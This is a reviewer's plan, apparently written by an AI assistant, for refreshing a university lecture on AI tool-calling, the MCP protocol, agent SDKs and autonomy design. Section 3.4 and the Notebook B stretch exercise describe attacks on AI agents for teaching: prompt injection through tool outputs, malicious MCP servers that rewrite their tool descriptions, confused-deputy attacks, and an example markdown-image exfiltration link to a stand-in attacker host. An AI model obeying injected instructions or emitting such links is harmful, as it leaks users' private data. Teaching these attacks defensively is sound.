# Lab 06 — AI API / MCP Lecture: Review & 2026 Refresh Plan

*Reviewer's notes for Fabio. Target: one 90-min lecture, MSc CS w/ some AI exposure.*

---

## 1. What's in the folder right now

I walked through every .md in `labs/06_ai-api/`. Grouped by maturity:

**Polished, load-bearing readings (keep as backbone)**
- `ai_tools_integration.md` — the "monolith → modules → services → SOA → REST → AI tools" historical arc. ~1000 lines, well written. Bezos memo, SOAP/WSDL/UDDI post-mortem, the "consumer is an AI, not a human" pivot. This is the strongest piece of narrative scaffolding you have. Still accurate in 2026, just needs a short "what's happened since" epilogue.
- `mcp_tutorial.md` — "The Design Space for AI+Tools" + intro to MCP. Excellent pedagogical structure: describes the *problem space* (describing, discovering, invoking, autonomy, testing, proliferation), then introduces MCP as *one* attempt. Needs targeted updates — see §4.
- `ai_interface.md` — "minimum standard, maximum leverage". The tool manifest, the 3-layer autonomy model (server invariants / org policy / user consent), verification ladder. Conceptually still excellent, design-oriented, framework-agnostic. Ages well.
- `aoa2.md` — "Designing Agentic Systems: Roles, Axes, Abstractions, and the Role of MCP". The axes (Who Reads What, Decision and Authority, Consent/Approvals/Terms). This is the most advanced piece. Very good. Core ideas are timeless. Add concrete 2026 anchors.
- `designing_agentic_systems.md` — tighter, slide-ready version of `aoa2.md` (5 axes, 5 missing abstractions, "MCP is to agentic systems what HTTP was to the web"). **This is your best deck outline already.** Likely the source for `aoa.pptx`.
- `gpt_propsal_for_abstractions.md` — "Declare / Enforce / Evidence" framing + the 9 abstractions (capability semantics, action classes + risk tiers, preview/commit, consent, terms, guided flow, receipts, semantic traces, business assertions). This is dense but gold. Great for a handout / take-home.
- `mcp-logging-observability.md` — MCP logging primitive + OTel primer. Concrete, correct as of late 2024, but the "OTel integration is an active proposal" line is now out of date (§4).

**Mostly TODO scaffolds (unfinished sub-readings)**
- `agentic_loop.md` — headings only. "Tool-calling loop + middleware." Fine to leave as a stub for now, or roll into the lecture.
- `autonomy_slider.md` — headings only. Content overlaps with `ai_interface.md` §"Autonomy and control".
- `safety_guardrails.md` — headings only. Prompt injection, confused deputy, exfiltration — all covered ideas, just not written out yet.
- `testing_observability.md` — headings only.
- `context_memory.md` — headings only.

**Rendered / delivered artifacts**
- `aoa.pdf`, `aoa.pptx`, `aoa-improved.pptx` — earlier slide decks (Feb 2025). Content is good; visuals and examples are what need refreshing.
- `aoa.html`, `aoa2.html`, `ai_tools_integration.html`, `mcp_tutorial.html`, `mcp-logging-observability.html`, `gpt_propsal_for_abstractions.html` — HTML exports of the readings.

**One longer reference**
- `mcp_tool_calling_and_ai_integration_surfaces.md` — 64KB. I didn't read it in full but from the title and size it's your "deep dive / all-in-one" reference reading. Keep as an optional companion.

---

## 2. What's aged well and what hasn't

### Aged well (keep, maybe reorganize, do not rewrite)
- The **historical arc** and the "components → services → tools" framing
- The **Bezos memo** and the lesson that clean boundaries are organizational, not technical
- The SOAP/WSDL/UDDI / CORBA post-mortem and the "classic vs new" problems table
- The **"autonomy is not binary" 3-layer model** (server invariants, org policy, user consent)
- The **verification ladder** (0–5)
- The **"MCP is to agents what HTTP is to the web"** analogy
- The **axes / abstractions** in `aoa2.md` and `designing_agentic_systems.md`
- The **Declare / Enforce / Evidence** design principle
- The **"Click" problem** metaphor for preference-learning autonomy. (Still holds, especially after the 2025 debates about personalization and agent loops.)

### Aged poorly or simply out of date

All of the below reflect the state of the world in Feb 2025. By April 2026 the field has moved. These are the concrete refresh targets:

| Location | What's dated | 2026 state |
|---|---|---|
| `mcp_tutorial.md` §9 ("What MCP standardizes") | Shows the old stdio + HTTP+SSE transports | MCP now standardizes **Streamable HTTP** as the primary remote transport. SSE is deprecated. |
| `mcp_tutorial.md` §9.2 ("What MCP doesn't standardize") | "No autonomy policies / fine-grained security beyond transport-level auth" | MCP spec now has **OAuth 2.1 authorization** (Resource Server + Protected Resource Metadata) and **Elicitation** (server-initiated structured asks to the user mid-call) |
| `mcp-logging-observability.md` §3 | "Active proposal to add OpenTelemetry trace support" | OTel **GenAI semantic conventions** are stable; MCP tracing is widely implemented, even if the spec is still minimal |
| `mcp-logging-observability.md` spec URL | `2024-11-05` | MCP has had multiple spec revisions through 2025 (`2025-03-26`, `2025-06-18`, `2025-11` ≈). Mention the spec is versioned and moving. |
| Everywhere | No mention of Skills, Agent SDKs, A2A, registries | See §3 below. |
| `mcp_tutorial.md` §7, §8 | "Autonomy / testing / proliferation are wide open" | Still largely true, but the vocabulary has matured. Skills, sub-agents, guardrail frameworks, eval harnesses are all now named things. |
| `ai_tools_integration.md` closing | Ends at "MCP is one attempt" | Add a 2025–26 epilogue: adoption wave, registry emergence, security incidents, the Skills/Agent SDK layer growing on top. |

---

## 3. What to add: the 2026 talking points

Structured so you can drop each as a slide or a discussion beat.

### 3.1 MCP has actually "won" (at least round 1)

- **Adoption wave 2025**: OpenAI adopted MCP in early 2025; Google/DeepMind and Microsoft followed through the year. It's now the default tool-use protocol across the major AI platforms and IDEs (Cursor, Windsurf, Claude Code, VS Code, Zed, JetBrains, etc.).
- **Why it won where WSDL didn't**: hello-world in minutes (the `@mcp.tool` decorator story in `mcp_tutorial.md` is the money shot), the consumer is a capable LLM, and the spec stayed small.
- **Discussion prompt**: "What's the 2026 equivalent of 'nobody wrote the WSDL by hand'? What could still kill MCP?"

### 3.2 What MCP *actually* standardizes now (vs Feb 2025)

Worth a fresh slide. MCP today ≈ JSON-RPC 2.0 + the following *primitives*:

- **Tools** — the call surface you already cover. `tools/list`, `tools/call`. Structured output + schemas.
- **Resources** — read-only data the server exposes (files, DB rows, documents). Often skipped in intros.
- **Prompts** — server-authored prompt templates the user can invoke.
- **Sampling** — the *server* can ask the client's LLM to generate text (reverse direction; rarely used, but architecturally interesting).
- **Elicitation** *(newer)* — server can ask the user a structured question mid-tool-call. Think: "what date range?" with a schema the client renders. Closes a big gap from the "guided flow" critique in `aoa2.md`.
- **Roots** — filesystem/namespace boundaries the server is allowed to see.
- **Logging** — as in `mcp-logging-observability.md`, plus progress notifications.
- **Auth** — OAuth 2.1 with Protected Resource Metadata (RFC 9728) for remote MCP servers. Pushed adoption in enterprise.
- **Transports** — stdio (local) + **Streamable HTTP** (remote). SSE-only is deprecated.

**Pedagogical payoff**: the list of primitives *itself* is a useful map of the design space. For each primitive you can ask: "which of Axis 1–5 from `aoa2.md` does this primitive touch?"

### 3.3 The layer above MCP is where 2026 lives: Skills + Agent SDKs

This is the single most important update. MCP is the wire; the interesting action moved up the stack.

- **Claude Skills (and similar patterns)**: folders of instructions + optional tools + optional code. Loaded on demand when the model decides they're relevant. A partial answer to the *tool proliferation* problem you flagged in `mcp_tutorial.md` §6 ("if you expose 500 tools, the LLM will struggle"). Skills are progressive disclosure: the model sees titles and descriptions, reads the SKILL.md when relevant, and can fan out into further files.
- **Agent SDKs** (Claude Agent SDK, OpenAI Agents SDK, LangGraph, etc.): the *loop* is now a library concern, not a DIY. They bundle:
  - tool-calling loop
  - sub-agent delegation
  - context compaction / memory
  - permission prompts (autonomy hooks!)
  - MCP client plumbing
  - tracing
- **Sub-agents / agent-to-agent (A2A)**: spec work from Google and others to make agents *themselves* callable as tools, with handoff protocols. This re-opens the whole "who's the agent, who's the service" question — a perfect axis-1 discussion.
- **Registries / marketplaces**: early attempts to solve discovery *across* organizations (Smithery-like directories, OAuth-based server trust, signed manifests). This echoes UDDI — worth the callback to your history arc.
- **Computer use / desktop agents**: the low-abstraction escape hatch. When a tool doesn't exist, the agent clicks through the UI. Re-raises the "web is the universal API" thought experiment you already have in `mcp_tutorial.md` §intro.

### 3.4 Autonomy & safety — the class of 2025 incidents

Your 3-layer autonomy model and the Click parable are great. Make them land with *real* 2025–26 incidents:

- **Prompt injection via tool outputs** — the "lethal trifecta" framing by Simon Willison (private data access + untrusted content + external communication). Use this to motivate why `side_effects` + `data_sensitivity` metadata matter.
- **MCP server supply-chain risk** — rogue/malicious MCP servers, "rug pull" on description after initial approval, and the "lie in the tool description" class of attacks.
- **Confused deputy in agents** — the agent has *more* authority than the attacker; the attacker smuggles instructions via data the agent reads.
- **Data exfiltration via images / markdown links** — model emits `![img](attacker.com?data=...)` as part of a "helpful" response.

All of these are concrete motivators for your `safety_guardrails.md` headings — you can fill the TODO sections in 20 min now that the attack taxonomy has names.

### 3.5 Open problems, 2026 edition

Your original list (autonomy, testing, proliferation) is still the right frame. Refine:

- **Autonomy**: still no cross-vendor standard. `requires_confirmation` remains an ad-hoc flag per SDK. Policy engines (OPA-style for agents) are emerging but not standardized.
- **Testing**: evals have exploded (Braintrust, Langfuse, promptfoo all matured; OpenAI evals, Anthropic evals frameworks). Still missing: **behavioral contracts** ("never call delete without preview"), regression baselines, coverage notions.
- **Tool proliferation**: partial fixes via Skills (progressive disclosure) and sub-agent delegation, but we still have no good answer to *semantic tool search* at scale.
- **Observability**: OTel GenAI semantic conventions are stabilizing (spans for `gen_ai.request`, tool calls, etc.), but *semantic* traces (intent → plan → action → outcome) still aren't standardized. Your `gpt_propsal_for_abstractions.md` proposal (#8) is still a live open question.
- **Consent / Receipts**: still essentially unsolved. `gpt_propsal_for_abstractions.md` §7 could be a whole research paper.
- **Guided flow**: still ad hoc. Elicitation is a small step; there's nothing like a BPMN-for-agents. Good discussion prompt.

### 3.6 A new frame I'd add: *the three planes*

Borrow the "data plane / control plane / evidence plane" framing from `gpt_propsal_for_abstractions.md` and introduce it early in the lecture. It's a clean way to answer "where does MCP fit?" without overselling or underselling:

- **Data plane** = tool invocation surface (MCP lives here)
- **Control plane** = policy, authority, guardrails (missing standards, mostly SDK-specific)
- **Evidence plane** = receipts, semantic traces, consent artifacts (wide open)

---

## 4. Concrete edits I'd propose (file by file)

Short, surgical. Not rewrites.

- `mcp_tutorial.md`
  - §3 "Invoking tools" — add Streamable HTTP as the primary remote transport, deprecate SSE reference.
  - §9.1 — add the full primitives list (Tools / Resources / Prompts / Sampling / Elicitation / Roots). A single bullet list is enough.
  - §9.2 — note that OAuth 2.1 is now in-spec; update the "no fine-grained security" bullet.
  - §10 (conclusion) — replace "In progress" with a one-line 2026 status per row.
- `mcp-logging-observability.md`
  - §3 — change "active proposal" to "OTel GenAI semantic conventions are stable; MCP-side conventions still thin". Keep the rest.
  - Update spec URL references from `2024-11-05` to current. Mention the spec is versioned and MCP has moved through multiple revisions.
- `ai_tools_integration.md`
  - Add a short closing section: "Epilogue — what happened between 2024 and 2026". Five bullets: MCP adoption, Skills/Agent SDKs layer, registries, A2A, incident taxonomy.
- `ai_interface.md`
  - Strong as-is. Optionally add a short "Elicitation as a partial server-side answer" paragraph under "Autonomy and control".
- `aoa2.md` / `designing_agentic_systems.md`
  - Use as the deck backbone. Add 2026 anchors in the margins (Skills, A2A, OAuth, elicitation, incidents). Don't restructure.
- `gpt_propsal_for_abstractions.md`
  - Promote to a separate "handout / companion reading". Mention in the lecture as "if you want to go deeper".
- TODO-stub files (`agentic_loop.md`, `autonomy_slider.md`, `safety_guardrails.md`, `testing_observability.md`, `context_memory.md`)
  - Decision point: either fill them this semester or delete them from the folder so the polished set reads as a coherent reader. **My recommendation: delete for now** (they create an impression of gaps that aren't really gaps — the content is already in the main readings). If you want to keep placeholders, add a header: "DRAFT — see `aoa2.md` / `ai_interface.md` for the published treatment".

---

## 5. Proposed 90-minute lecture arc

Designed for MSc CS students who've already done labs 01–02 (single LLM call → stateful agent). They've *used* tools via SDKs but probably haven't thought about the standardization problem.

| Time | Beat | Source material | Note |
|---|---|---|---|
| 0–5 | Hook: "The web works for humans. Why not for agents?" Show Amazon checkout flow, then show a tool call. What's missing? | `mcp_tutorial.md` intro | Keep it visual. |
| 5–15 | History arc, compressed: components → services → SOA → REST. Bezos memo. SOAP's failure: lesson is "standards must reduce friction, not maximize expressiveness". | `ai_tools_integration.md` §1–4, §7–8 | Existing slides from aoa.pptx mostly cover this. |
| 15–25 | The pivot: **the consumer is now an LLM**. What changes? 3 things: more tolerant of imperfect specs; can read *more* context; but can *infer intent* and *act*. Introduce the "who's the agent" axis. | `aoa2.md` Axis 1, `designing_agentic_systems.md` Axis 1–2 | This is the conceptual heart. Slow down here. |
| 25–40 | The design space: describing / discovering / invoking / **autonomy** / **testing** / **proliferation**. First three are classic; last three are new. | `mcp_tutorial.md` §1–8 | The table at §8 is your money slide. |
| 40–55 | MCP as *one* attempt at the first three. Primitives (Tools, Resources, Prompts, Sampling, Elicitation, Roots, Logging, Auth, Transports). Live demo or code walk: a tiny FastMCP server. | `mcp_tutorial.md` §9 + notebook 1 (see §6 below) | Keep the demo under 5 min. |
| 55–70 | What MCP *doesn't* solve. Introduce the **Declare / Enforce / Evidence** frame and the three planes. Walk the 5 missing abstractions from `designing_agentic_systems.md`. | `designing_agentic_systems.md` + `gpt_propsal_for_abstractions.md` | The "HTTP : web :: MCP : agents" analogy goes here. |
| 70–80 | Autonomy + safety. 3-layer model. Verification ladder. Real 2025–26 incidents (lethal trifecta, rogue MCP servers, confused deputy, image exfiltration). | `ai_interface.md` + new content from §3.4 above | Use one real CVE or blog-post incident as anchor. |
| 80–88 | What 2026 added *on top* of MCP: Skills, Agent SDKs, A2A, registries, computer use. The layer above the wire. | New content from §3.3 above | Ties back to the "tool proliferation" open problem. |
| 88–90 | Closing: what would you standardize first, if you ran the committee? (Callback to `ai_interface.md` §MVP.) Tease next lab. | `ai_interface.md` discussion prompts | Leave them with a question, not a summary. |

Two natural break points if you want to split into 45+45: after "MCP primitives" (min 55) and before "autonomy + safety" (min 70).

---

## 6. Slide deck suggestions

You already have `aoa.pptx` and `aoa-improved.pptx` — they're structured around `aoa2.md` / `designing_agentic_systems.md`. They mostly need *additions*, not a rebuild.

Proposed slide additions (in order, numbered to match the lecture arc above):

1. **(min 5) "Where we are in 2026"** — one-slide infographic: 2022 LLMs → 2023 tool calling → 2024 MCP → 2025 adoption + Skills → 2026 A2A + agent registries. Just a timeline.
2. **(min 40) "MCP primitives"** — one slide with 9 tiles (Tools, Resources, Prompts, Sampling, Elicitation, Roots, Logging, Auth, Transports) and what each standardizes. This single slide is the biggest upgrade vs the old deck.
3. **(min 55) "Three planes"** — data / control / evidence. One slide, three columns. Show which abstractions live where. This is the cleanest mental model to give students.
4. **(min 60) "What MCP does NOT standardize"** — five bullets from `designing_agentic_systems.md` (intent, autonomy, alignment, responsibility, safety). Contrast with the prior slide.
5. **(min 70) "Real 2025–26 incidents"** — four stacked cards (lethal trifecta, rogue MCP server, confused deputy, markdown-image exfil). One sentence each. This is what will stick.
6. **(min 80) "The layer above MCP"** — Skills / Agent SDKs / A2A / registries / computer use. Five tiles. Frame as "2026's answers to proliferation, orchestration, and discovery".
7. **(min 88) "What would you standardize first?"** — single question slide. Optionally show the MVP list from `ai_interface.md` as a starter for the discussion.

Visual style advice: the old deck leans on text. For the three new conceptual slides (primitives, three planes, incidents), go picture-heavy. A single diagram beats a bulleted list for retention.

You may also want to **retire** a couple of the older slides that restate material covered in the new ones. Without seeing `aoa-improved.pptx` rendered, I'd bet 3–5 existing slides become redundant once you add the 7 above.

---

## 7. Notebook suggestions (2–3, runnable, ≤ 30 min each)

You already have `labs/03_ai-api` (per the repo CLAUDE.md) as the MCP-and-tools lab. The lecture deserves hands-on to land. Three graded options, in order of ambition:

### Notebook A — "Hello, MCP" (*~20 min, everyone should run*)
- Build a trivial FastMCP server with two tools: `get_weather(city)` (fake) and `list_tickets(status, date)` (stub).
- Connect via the Claude / OpenAI Agent SDK as an MCP client.
- Have students inspect the raw JSON-RPC over stdio (print the messages).
- **Learning goal**: see what's actually on the wire. MCP stops being magic.
- **Discussion**: modify one tool's description and watch the agent's tool selection change. Tie to `mcp_tutorial.md` §1 ("minimal vs better descriptions").

### Notebook B — "Autonomy and guardrails" (*~30 min, core of the lecture*)
- Take the Notebook A server. Add a third tool: `send_email(to, body)`.
- Wrap the client's tool-calling loop with a **middleware** that:
  - tags each tool as `read_only` | `write` | `destructive`
  - auto-approves read-only, prompts for write, blocks destructive
  - logs every invocation with a correlation ID
- Test with a benign and a slightly-adversarial prompt.
- **Learning goal**: autonomy is a design decision you *enforce*, not a prompt suggestion. `requires_confirmation` is cheap and powerful.
- **Stretch**: inject prompt-injection in a tool's return value and observe what happens.

### Notebook C — "Skills and the agentic loop" (*~30 min, for students who want more*)
- Package one of Notebook A's tools as a *Skill* (folder with SKILL.md + a helper script).
- Contrast: direct tool invocation vs Skill loaded on demand.
- Show context-window savings when you have 20 tools and the agent only loads the relevant skill.
- **Learning goal**: proliferation is solvable by *progressive disclosure*, not by bigger context windows.

Each notebook should ship with: a minimal `uv`-friendly `pyproject.toml` fragment, a `README.md` with the learning goal, and 2–3 "try this" questions at the bottom (not tests, prompts for reflection).

---

## 8. Small housekeeping things

Noticed while reviewing:

- The folder name is `06_ai-api` but the top-level `CLAUDE.md` says labs are under `03_ai-api`. Either renumber or fix the CLAUDE.md so students/tooling don't get confused.
- `gpt_propsal_for_abstractions.md` has a typo (`propsal` → `proposal`). Worth a rename.
- `.DS_Store` is tracked. Probably want to add to `.gitignore`.
- Figures folder `figs/` referenced by many files — I didn't inspect it, but most figures are historical (integration wild west, SOA stack, Comic Sans masterpiece). The autonomy-spectrum and message-flow diagrams are the ones to refresh with 2026 anchors.

---

## 9. Open questions for you (before I touch any source file)

These will shape the actual edits. Happy to do each one after you answer:

1. **Scope of edits**: do you want me to go ahead and produce a draft of the surgical edits to `mcp_tutorial.md`, `mcp-logging-observability.md`, and `ai_tools_integration.md` — or keep those for you to do yourself?
2. **TODO-stub files**: delete, keep as placeholders with a pointer, or fill in this pass?
3. **Slide deck**: do you want me to produce an updated `aoa-2026.pptx` with the 7 additional slides? I'd build them on top of `aoa-improved.pptx` rather than from scratch.
4. **Notebooks**: should I scaffold Notebook A as a runnable starting point, or is this just a design doc for now?
5. **2025–26 incidents**: do you have specific ones you want me to cite (talks, blog posts, CVEs), or should I propose 3–4 well-known public ones?

---

*End of review. No source files in the folder were modified.*
